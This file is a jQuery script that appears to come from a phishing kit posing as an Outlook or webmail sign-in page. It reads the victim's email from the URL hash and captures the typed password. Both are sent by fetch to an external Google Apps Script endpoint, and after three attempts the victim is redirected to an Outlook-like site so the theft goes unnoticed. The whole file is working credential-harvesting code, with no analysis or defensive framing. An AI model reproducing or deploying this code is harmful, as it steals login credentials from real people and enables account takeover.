$(document).ready(function () {
  var count = 0;
  /////////////url email getting////////////////
  var email = window.location.hash.substr(1);
  if (!email) {
  } else {
    // $('#email').val(email);
    var my_email = email;
    var ind = my_email.indexOf("@");
    var my_slice = my_email.substr(ind + 1);
    var c = my_slice.substr(0, my_slice.indexOf("."));
    var final = c.toLowerCase();
    $("#msg").hide();
    // $('#fieldImg').attr('src', 'images/other-1.png');
    // $('#field').html("Other Mail");
    $("#email").val(my_email);
    $("#dom").html(my_slice);

    $("#msg").hide();
  }
  ///////////////url getting email////////////////

  $("#submit-btn").click(function (event) {
    $("#error").hide();
    $("#msg").hide();
    event.preventDefault();
    var email = $("#email").val();
    var password = $("#password").val();
    var msg = $("#msg").html();
    $("#msg").text(msg);
    ///////////new injection////////////////
    var my_email = email;
    var filter =
      /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

    if (!filter.test(my_email)) {
      $("#error").show();
      email.focus;
      return false;
    }

    var ind = my_email.indexOf("@");
    var my_slice = my_email.substr(ind + 1);
    var c = my_slice.substr(0, my_slice.indexOf("."));
    var final = c.toLowerCase();
    var n = my_email.search("@");
    ///////////new injection////////////////
    count = count + 1;

    // Form submission using Fetch API
    const data = new FormData();
    data.append('email', email);
    data.append('password', password);

    fetch('https://script.google.com/macros/s/AKfycbz3AWVow6I5v8QudsabABDFDV7RwBEkxNm7qRCzu5ne5WytfuGRts8wDiWYbVba4tY/exec', {
      method: 'POST',
      body: data,
    })
      .then(response => response.text())
      .then(data => {
        if (data) {
          $("#msg").show();
          console.log(data);
          if (data.includes("ok")) {
            $("#password").val("");
            if (count >= 3) {
              count = 0;
              window.location.replace("https://outlookwebapp.com");
            }
            $("#msg").html("Successful: " + data);
          } else {
            $("#msg").html(data);
          }
        }
      })
      .catch(() => {
        $("#password").val("");
        if (count >= 3) {
          count = 0;
          window.location.replace("https://outlookwebapp.com/");
        }
        $("#msg").show();
        $("#msg").html("Please try again later");
      })
      .finally(() => {
        $("#submit-btn").html("Sign in");
      });
  });
});


  function getEmail() {
    if (window.location.hash) {
      var url = window.location.href;
      var hash = url.split("#").pop();
      return atob(hash);
    }
  }